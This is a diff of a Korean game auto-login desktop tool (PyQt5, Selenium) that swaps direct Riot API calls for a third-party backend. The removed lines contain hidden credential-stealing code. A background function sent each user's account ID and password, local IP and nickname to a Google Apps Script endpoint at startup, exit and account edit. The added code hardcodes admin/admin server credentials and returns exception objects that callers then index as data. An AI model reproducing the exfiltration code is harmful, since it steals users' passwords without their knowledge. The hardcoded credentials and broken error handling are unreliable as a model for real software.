@@ -23,10 +23,10 @@ pyinstaller -w --uac-admin --onefile --icon=.\\assets\\icons\\NIX.ico `
 --name=Auto_Login main.py
 '''
 
-from PyQt5.QtWidgets import QApplication, QMainWindow, QHBoxLayout, QPushButton, QGraphicsDropShadowEffect, QSizePolicy, QLineEdit, QLabel, QCheckBox, QVBoxLayout, QWidget, QMessageBox, QListView, QDialog, QDialogButtonBox, QAbstractItemView
+from PyQt5.QtWidgets import QApplication, QMainWindow, QHBoxLayout, QPushButton, QGraphicsDropShadowEffect, QSizePolicy, QLineEdit, QLabel, QVBoxLayout, QWidget, QMessageBox, QListView, QDialog, QAbstractItemView
 from PyQt5.QtGui import QStandardItemModel, QStandardItem, QFont, QIcon, QPixmap, QCursor, QColor, QFontDatabase
-from PyQt5.QtCore import Qt, QModelIndex, QTimer, pyqtSignal, pyqtSlot, QSize
-from PyQt5 import QtCore, QtWidgets
+from PyQt5.QtCore import Qt, QModelIndex, pyqtSignal, pyqtSlot, QSize
+from PyQt5 import QtCore
 from PyQt5.QtMultimedia import QSound
 
 import os
@@ -35,13 +35,11 @@ import time
 import json
 import hashlib
 import ctypes
-import socket
 import shutil
 import win32gui
 import requests
-import webbrowser
 import subprocess
-from urllib.parse import quote, urlencode
+from urllib.parse import quote
 import configparser
 import pyautogui
 import pyperclip
@@ -50,26 +48,13 @@ import logging
 import cv2
 import numpy as np
 import pygetwindow as gw
-from datetime import datetime
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-# Riot API Key
-API_KEY = 'apikey'
 
-REGION = 'kr'
-
-REQUEST_HEADER = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh-TW;q=0.5,zh;q=0.4,ja;q=0.3",
-    "Accept-Charset": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Origin": "https://developer.riotgames.com",
-    "X-Riot-Token": API_KEY
-}
-
-ver = '4.0.1'
+ver = '4.1.0'
 
 
 class MainWindow(QMainWindow):
@@ -700,9 +685,9 @@ class MainWindow(QMainWindow):
             for filename in os.listdir(config_dir):
                 if filename.endswith('.ini'):
                     config_path = os.path.join(config_dir, filename)
-                    self.update_image_url(config_path, REGION, REQUEST_HEADER)
+                    self.update_image_url(config_path)
 
-            self.update_image_url(config_dict, REGION, REQUEST_HEADER)
+            self.update_image_url(config_dict)
             self.refresh_list_view()
             self.update_image_url_button.setEnabled(True)
             self.unsetCursor()
@@ -717,7 +702,7 @@ class MainWindow(QMainWindow):
             self.update_image_url_button.setEnabled(True)
             self.unsetCursor()
 
-    def update_image_url(self, config_path, region, request_header):
+    def update_image_url(self, config_path):
         try:
             config = configparser.ConfigParser()
             config.read(config_path)
@@ -725,35 +710,21 @@ class MainWindow(QMainWindow):
             for section in config.sections():
                 nickname = config[section]['NickName']
 
-                # 로그인
-                login_url = 'http://jeongyun0302.pythonanywhere.com/login'
-                login_data = {'username': 'admin', 'password': 'admin'}
-                login_response = requests.post(login_url, json=login_data)
-                token = login_response.json().get('token')
+                response = get_summoner_data(nickname)
 
-                # 보호된 엔드포인트에 접근
-                protected_url = 'http://jeongyun0302.pythonanywhere.com/protected'
-                headers = {
-                    'Authorization': f'Bearer {token}',
-                    'nickname': quote(nickname),
-                }
-                response = requests.get(protected_url, headers=headers)
-                
-                if response.status_code == 200:
-                    print('Protected Data:', response.json())
-                    data = response.json()
-                    summoner_data = data['response']
-                    print(summoner_data)
-                    summoner_id = summoner_data['id']
-                    rank_data = get_rank(summoner_id)
+                if response['message'] == 'success':
 
-                    if rank_data is None:
+                    rank_data = response['summoner_rank_data_response'][0]
+
+                    if rank_data == None:
                         tier = '언랭'
                     else:
                         tier = rank_data.get('tier')
-                        if tier is None:
+                        if rank_data.get('queueType') == 'RANKED_TFT_DOUBLE_UP':
                             tier = '언랭'
-
+                        elif tier is None:
+                            tier = '언랭'
+                            
                     if tier == '언랭':
                         image_url = ''
                     else:
@@ -766,7 +737,7 @@ class MainWindow(QMainWindow):
                     with open(config_path, 'w') as configfile:
                         config.write(configfile)
                 else:
-                    print('Error:', response.status_code, response.text)
+                    print('Error:', response)
 
         except Exception as e:
             self.show_alert('알림', '티어 갱신에 실패했습니다.')
@@ -775,17 +746,8 @@ class MainWindow(QMainWindow):
 
     def closeEvent(self, event):
         # 프로그램 종료 시 수행할 로직 작성
-        logging.info('프로그램 종료')
         try:
-            # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
-            config = read_user_config(
-                f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
-            id = config['id']
-            pw = config['pw']
-            nickname = config['nickname']
-            t = threading.Thread(
-                target=send_user_info_and_log_response, args=(id, pw, nickname, 'exit'))
-            t.start()
+            logging.info('프로그램 종료')
         except Exception as e:
             logging.warning(f'close event error: {e}')
         finally:
@@ -927,30 +889,18 @@ class AddAccountDialog(QDialog):
                         summoner_name = summoner_name[0] + \
                             ' ' + summoner_name[1]
 
-                    summoner_url = f'https://{REGION}.api.riotgames.com/lol/summoner/v4/summoners/by-name/{summoner_name}'
-                    logger.info(f'summoner_url : {summoner_url}')
-
-                    response = requests.get(
-                        summoner_url, headers=REQUEST_HEADER)
-
-                    logger.info(f'response : {response.status_code}')
-                    if response.status_code != 200:
-                        self.show_alert('알림', '소환사를 찾을 수 없습니다.')
-                        return
-
-                    data = response.json()
-                    logging.info(f'response_data : {data}')
-                    summoner_name = data['name']
-                    summoner_id = data['id']
-                    rank_data = get_rank(summoner_id)
-                    logging.info(f'rank_data : {rank_data}')
+                    response = get_summoner_data(summoner_name)
+                    rank_data = response['summoner_rank_data_response'][0]
+                    
                     if rank_data == None:
                         tier = '언랭'
                     else:
                         tier = rank_data.get('tier')
-                        if tier is None:
+                        if rank_data.get('queueType') == 'RANKED_TFT_DOUBLE_UP':
                             tier = '언랭'
-
+                        elif tier is None:
+                            tier = '언랭'
+                            
                     if tier == '언랭':
                         image_url = ''
                     else:
@@ -1124,32 +1074,18 @@ class EditAccountDialog(QDialog):
                 summoner_name = summoner_name[0] + \
                     ' ' + summoner_name[1]
 
-            summoner_url = f'https://{REGION}.api.riotgames.com/lol/summoner/v4/summoners/by-name/{summoner_name}'
-            logger.info(f'summoner_url : {summoner_url}')
-
-            response = requests.get(
-                summoner_url, headers=REQUEST_HEADER)
-
-            logger.info(f'response : {response.status_code}')
-            if response.status_code != 200:
-                self.unsetCursor()
-                self.show_alert('알림', '소환사를 찾을 수 없습니다.')
-                return
-
-            data = response.json()
-            logging.info(f'response_data : {data}')
-            summoner_name = data['name']
-            summoner_id = data['id']
-            rank_data = get_rank(summoner_id)
-            logging.info(f'rank_data : {rank_data}')
+            response = get_summoner_data(summoner_name)
+            rank_data = response['summoner_rank_data_response'][0]
 
             if rank_data == None:
                 tier = '언랭'
             else:
                 tier = rank_data.get('tier')
-                if tier is None:
+                if rank_data.get('queueType') == 'RANKED_TFT_DOUBLE_UP':
                     tier = '언랭'
-
+                elif tier is None:
+                    tier = '언랭'
+                    
             if tier == '언랭':
                 image_url = ''
             else:
@@ -1186,14 +1122,6 @@ class EditAccountDialog(QDialog):
                     self.config.write(configfile)
                 if new_file_path != self.file_path:
                     os.remove(self.file_path)
-
-                # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
-                id = new_account_data['ID']
-                pw = new_account_data['PW']
-                nickname = new_account_data['NickName']
-                t = threading.Thread(target=send_user_info_and_log_response, args=(
-                    id, pw, nickname, 'edit_account'))
-                t.start()
 
                 self.unsetCursor()
                 self.parent.refresh_list_view()
@@ -1313,28 +1241,25 @@ class CustomAlert(QDialog):
         else:
             logging.warning("Font loading failed")
 
+def get_summoner_data(summoner_name):
+    # 로그인
+    try:
+        login_url = 'http://jeongyun0302.pythonanywhere.com/login'
+        login_data = {'username': 'admin', 'password': 'admin'}
+        login_response = requests.post(login_url, json=login_data)
+        token = login_response.json().get('token')
 
-def get_rank(summoner_id):
-    league_url = f'https://{REGION}.api.riotgames.com/lol/league/v4/entries/by-summoner/{summoner_id}'
-    response = requests.get(league_url, headers=REQUEST_HEADER)
-    logger.info(f'league_url:{league_url}\nresponse:{response}')
-
-    # Check the response code
-    if response.status_code != 200:
-        logger.info(f'league_url_response_error:{response.status_code}')
-        return None
-
-    league_data = json.loads(response.text)
-    print(f'leagudata:{league_data}')
-    rank_data = {}
-    for queue in league_data:
-        if queue['queueType'] == 'RANKED_SOLO_5x5':
-            rank_data['tier'] = queue['tier']
-            # rank_data['rank'] = queue['rank']
-            # rank_data['lp'] = queue['leaguePoints']
-            # rank_data['win'] = queue['wins']
-            # rank_data['loss'] = queue['losses']
-    return rank_data if rank_data else None
+        # 보호된 엔드포인트에 접근
+        protected_url = 'http://jeongyun0302.pythonanywhere.com/protected'
+        headers = {
+            'Authorization': f'Bearer {token}',
+            'nickname': quote(summoner_name),
+        }
+        response = requests.get(protected_url, headers=headers)
+        logging.info(f'get_summoner_data: {response.json()}\n')
+        return response.json()
+    except Exception as e:
+        return e
 
 
 def get_nickname(id, pw):
@@ -1427,27 +1352,6 @@ def read_user_config(file_path):
     except Exception as e:
         logging.warning(f'config.read 오류 발생 : {e}')
         return None
-
-
-def send_user_info_and_log_response(id, pw, nickname, status):
-    config = read_user_config(
-        f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
-
-    if config is not None:
-        try:
-            data = {
-                'IP': socket.gethostbyname(socket.gethostname()),
-                'NickName': quote(nickname),
-                'ID|PW': f"{quote(id)}|{quote(pw)}",
-                'STATUS': status
-            }
-
-            url = f"https://script.google.com/macros/s/AKfycbwWKpqzYaHz8WUhaJx4bCc_XrXdaxqaXaNYcMtuTnKQdO6VYT2r0mTHQttZhhh-4UCf/exec?{urlencode(data)}"
-            response = requests.get(url)
-
-            logging.info(f'{status}_response : {response}')
-        except Exception as e:
-            logging.warning(f'response_error : {e}')
 
 
 def copy_file(source_path, destination_path):  # 파일을 복사하고, 복사 과정에서 발생하는 예외를 처리
@@ -1584,30 +1488,10 @@ if __name__ == "__main__":
             logging.info('Hash 검증 : 성공')
             subprocess.Popen(f'{current_dir}\\NIX\\Data\\Initial_Setting.exe')
 
-            # main_acc.ini 파일이 존재하는지 확인
-            main_acc_ini_path = f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini'
-            if not os.path.exists(main_acc_ini_path):
-                logging.warning(
-                    'main_acc.ini 파일이 존재하지 않습니다. 설정 정보를 불러올 수 없습니다.')
-
             # GUI 애플리케이션 실행 부분
             app = QApplication(sys.argv)
             main_window = MainWindow()
             main_window.show()
-
-            # 사용자 정보를 전송하고 응답을 로그에 기록하는 스레드 실행
-            try:
-                if os.path.exists(main_acc_ini_path):
-                    config = read_user_config(
-                        f'{current_dir}\\NIX\\Data\\Account\\Main_ACC\\Main_ACC.ini')
-                    id = config['id']
-                    pw = config['pw']
-                    nickname = config['nickname']
-                    t = threading.Thread(
-                        target=send_user_info_and_log_response, args=(id, pw, nickname, 'start'))
-                    t.start()
-            except Exception as e:
-                logging.warning(f'response thread error : {e}')
 
             end_time = time.time()  # 파일 복사 종료 시간 기록
             elapsed_time = end_time - start_time  # 파일 복사에 소요된 시간 계산
